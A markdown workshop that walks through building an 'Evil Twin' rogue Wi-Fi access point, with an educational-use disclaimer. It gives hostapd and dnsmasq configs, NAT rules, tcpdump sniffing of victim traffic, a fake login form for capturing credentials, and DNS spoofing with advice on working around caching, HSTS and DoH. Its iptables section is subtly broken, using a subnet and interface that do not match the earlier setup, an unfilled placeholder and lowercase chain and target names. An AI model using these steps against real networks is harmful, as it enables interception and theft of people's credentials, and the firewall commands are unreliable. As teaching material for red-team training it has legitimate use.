# Warning
This workshop is for educational purposes only.
Ethical hacking is conducted with the explicit permission of the system owner to improve security. Unauthorized access to networks is illegal and strictly prohibited.

# Table of Contents

- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
  - [How an evil twin works](#how-an-evil-twin-works)
    - [Steps of Evil Twin Functionality:](#steps-of-evil-twin-functionality)
    - [Key Elements Involved:](#key-elements-involved)
  - [Use Cases:](#use-cases)
- [Workshop](#workshop)
  - [Create your Access Point](#create-your-access-point)
  - [Routing to Internet](#routing-to-internet)
  - [Monitoring Traffic](#monitoring-traffic)
  - [DNS Spoofing](#dns-spoofing)

---

# Introduction

An **Evil Twin** is a rogue Wi-Fi access point that appears to be legitimate but is set up to eavesdrop on wireless communications. It represents a Man-in-the-Middle (MitM) attack specifically tailored for wireless networks. By tricking users into connecting to this fake Access Point (AP) instead of the real one, the attacker can intercept, modify, or block the victim's network traffic.



## How an evil twin works

The core concept is to mimic a legitimate network's SSID (Service Set Identifier) and sometimes its MAC address. Devices often automatically connect to known SSIDs, especially open networks, or switch to an AP with a stronger signal.

### Steps of Evil Twin Functionality:
1. **Reconnaissance:** The attacker scans the environment to identify the target network, its SSID, and the hardware channel it operates on.
2. **Access Point Creation:** The attacker sets up a rogue AP broadcasting the exact same SSID as the target. To make it more appealing, they usually boost their signal strength.
3. **Deauthentication (Optional but common):** The attacker sends spoofed deauthentication frames to the clients connected to the legitimate AP. When the clients disconnect and try to reconnect, they automatically join the attacker's "Evil Twin" because of its stronger signal.
4. **Interception:** Once connected, all the victim's traffic flows through the attacker's machine, allowing for packet sniffing, DNS spoofing, and credential harvesting.

### Key Elements Involved:
* A wireless network adapter capable of entering **Monitor Mode** (to inject deauth packets) and **Master/AP Mode** (to broadcast the network).
* Software to broadcast the AP (e.g., `hostapd`).
* Software to assign IP addresses and route DNS requests (e.g., `dnsmasq`).
* Network Address Translation (NAT) to forward the victim's traffic to the real internet, keeping them unaware of the interception.

## Use Cases:
* **Malicious:** Stealing login credentials, session hijacking, delivering malware, or capturing sensitive financial data.
* **Educational / Ethical:** Red team engagements to test a company's wireless security posture, demonstrating the risks of public Wi-Fi to employees, and validating network segregation.

---

# Workshop

In this hands-on workshop, you will build an Evil Twin attack from scratch. You will need a Linux environment and a Wi-Fi adapter. Let's assume your internet-facing interface is `eth0` and your wireless interface is `wlan0`.

## Create your Access Point

First, we need to set up the wireless interface to act as an Access Point. If you only have one wireless card, we can try to create a virtual interface so you can still use the physical one for other tasks (if your hardware supports it).

**1. Check your wireless interfaces:**
```bash
iwconfig
# or
ip a
```

**2. Create a virtual interface (Optional):**
If you want to create a virtual AP interface named `wlan0_ap` linked to your physical `wlan0`:
```bash
sudo iw dev wlan0 interface add wlan0_ap type __ap
```

**3. Configure `hostapd`:**
`hostapd` is a user-space daemon used for wireless access points and authentication servers. Create a configuration file named `hostapd.conf`:

```conf
# hostapd.conf
interface=wlan0_ap
driver=nl80211
ssid=Free_Public_WiFi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
```

**4. Start the Access Point:**
```bash
sudo hostapd ./hostapd.conf
```
*Leave this running in a terminal. You should now see "Free_Public_WiFi" broadcasting from your phone or another device.*

## Routing to Internet

Right now, devices can connect to your AP, but they won't get an IP address and cannot browse the internet. We need to set up a DHCP server and route their traffic.

**1. Assign an IP to your AP interface:**
Open a new terminal and give your access point a gateway IP address.
```bash
sudo ifconfig wlan0_ap 192.168.1.1 netmask 255.255.255.0 up
```

**2. Configure `dnsmasq`:**
`dnsmasq` will handle assigning IP addresses to victims (DHCP) and resolving their DNS requests. Create `dnsmasq.conf`:

```conf
# dnsmasq.conf
interface=wlan0_ap
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1 # Default Gateway
dhcp-option=6,8.8.8.8 # DNS Server
```

Start the service:
```bash
sudo dnsmasq -C ./dnsmasq.conf -d
```

**3. Set up NAT (Network Address Translation):**
To forward the traffic from your fake AP (`wlan0_ap`) out to the real internet (`eth0`), you need to enable IP forwarding and configure `iptables`.

```bash
# Enable IP Forwarding in the kernel
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush old rules (optional, be careful if you have a custom firewall)
sudo iptables -F
sudo iptables -t nat -F

# Set up IP Masquerading
iptables -t nat -A postrouting -s 192.168.50.0/24 -o $interface_internet$ -j masquerade 
iptables -A FORWARD -i ap0 -o $interface_internet$ -j ACCEPT
iptables -A FORWARD -i $interface_internet$ -o ap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```
*Your connected devices should now have full internet access.*

## Monitoring Traffic

Because all victim traffic is now routing through your machine, you can passively monitor it.

**1. Using `tcpdump`:**
We will monitor ports `80` (HTTP) and `443` (HTTPS) to see the web traffic passing through our Evil Twin.

```bash
sudo tcpdump -i wlan0_ap port 80 or port 443 -n -v
```

**2. Create an HTTP test page:**
Because HTTPS traffic is encrypted, you won't be able to read the contents or passwords natively. To demonstrate how dangerous unencrypted traffic is, let's host a quick HTTP page.

Create a file called `index.html`:
```html
<html>
<body>
  <h1>Welcome to the Network</h1>
  <form action="" method="POST">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
```

Serve it quickly using Python on port 80:
```bash
sudo python3 -m http.server 80
```
*Connect a device to your AP, navigate to `http://192.168.1.1`, submit some credentials, and watch them appear in cleartext via your network sniffer!*

You can also use Apache2.

## DNS Spoofing

The ultimate goal of an Evil Twin is often to redirect a user to a fake captive portal or a cloned login page. We can do this by lying about DNS records.



**1. Configure Spoofing in `dnsmasq`:**
Stop your running `dnsmasq` process. Edit your `dnsmasq.conf` to redirect a target domain (e.g., `example.com`) to your attacker IP (`192.168.1.1` where your Python server is running).

Add this line to `dnsmasq.conf`:
```conf
address=/example.com/192.168.1.1
```
Restart `dnsmasq`.

**2. The Browser vs. Dig Challenge:**
If you run `dig example.com` from a connected victim machine, you will likely see the response successfully return `192.168.1.1`. However, if you type `example.com` into a web browser, it might fail or load the real website.

**Why does this happen and how do we fix it?**

* **DNS Caching:** Operating systems and web browsers aggressively cache DNS results to speed up browsing.
    * *Solution:* Flush the OS DNS cache (e.g., `ipconfig /flushdns` on Windows), clear the browser cache, or open a fresh "Incognito/Private" window.
* **HSTS (HTTP Strict Transport Security):** If you try to spoof a major website like `facebook.com` or `google.com`, modern browsers know these sites *must* use HTTPS. Because your fake server does not have a valid TLS/SSL certificate signed by a trusted Authority for "facebook.com", the browser will show a hard warning and block the connection.
    * *Solution for the Workshop:* To successfully demonstrate the redirection, test it on a site that does not use HSTS or HTTPS, such as `http://neverssl.com`, or create a fictitious domain that doesn't exist on the real internet to see your fake login page appear.
* **DNS over HTTPS (DoH):** Modern browsers (like Chrome or Firefox) often bypass the local network's DNS server entirely and send encrypted DNS requests directly to Google or Cloudflare.
    * *Solution:* Turn off "Secure DNS" in the browser settings of your test victim machine.
